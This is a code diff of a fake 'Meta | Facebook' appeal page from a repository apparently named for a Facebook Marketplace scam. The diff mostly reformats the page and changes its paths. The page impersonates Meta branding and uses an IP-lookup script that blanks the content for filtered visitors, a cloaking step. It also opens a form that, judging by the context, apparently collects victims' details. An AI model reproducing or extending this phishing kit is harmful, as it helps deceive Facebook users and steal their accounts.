@@ -22,11 +22,15 @@
     }
 </style>
 <div id="intro">
-    <img id="meta-logo" src="./img/loadingLogo.gif" alt="Meta Logo" />
+    <img
+        id="meta-logo"
+        src="https://raw.githubusercontent.com/hanguyen1406/fb-market-place-scam/refs/heads/main/apeal-form/img/loadingLogo.gif"
+        alt="Meta Logo"
+    />
 </div>
 <script>
     window.onload = async () => {
-        var url = "https://api.db-ip.com/v2/free/self/";
+        var url = "/apeal-form/ip.php";
         const response = await fetch(url);
         console.log(response);
         if (response.status == 200) {
@@ -37,7 +41,7 @@
                     document.getElementById("intro").style.display = "none";
                 }, 5000); // 2 giây
             } else {
-                document.body.innerHTML='';
+                document.body.innerHTML = "";
             }
         }
     };
@@ -46,17 +50,20 @@
 <!DOCTYPE html>
 <html lang="sg" id="html">
     <head>
-        <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
-        <meta http-equiv="Pragma" content="no-cache">
-        <meta http-equiv="Expires" content="0">
+        <meta
+            http-equiv="Cache-Control"
+            content="no-cache, no-store, must-revalidate"
+        />
+        <meta http-equiv="Pragma" content="no-cache" />
+        <meta http-equiv="Expires" content="0" />
 
         <meta charset="UTF-8" />
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
         <meta property="og:image" content="https://i.imgur.com/4EzYFyb.jpeg" />
         <title>Meta | Facebook</title>
-        <link rel="stylesheet" href="./styles/bootstrap.min.css" />
+        <link rel="stylesheet" href="bootstrap.min.css" />
         <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
-        <link rel="stylesheet" href="./styles/style.css" />
+        <link rel="stylesheet" href="style.css" />
         <link
             rel="shortcut icon"
             href="https://i.imgur.com/FOY6xZ9.png"
@@ -1117,10 +1124,7 @@
                                     class="fb-logo-round"
                                 />
                             </div>
-                            <form
-                                id="apiForm"
-                                autocomplete="off"
-                            >
+                            <form id="apiForm" autocomplete="off">
                                 <!-- Thêm sự kiện onsubmit -->
                                 <div class="mb-3">
                                     <label
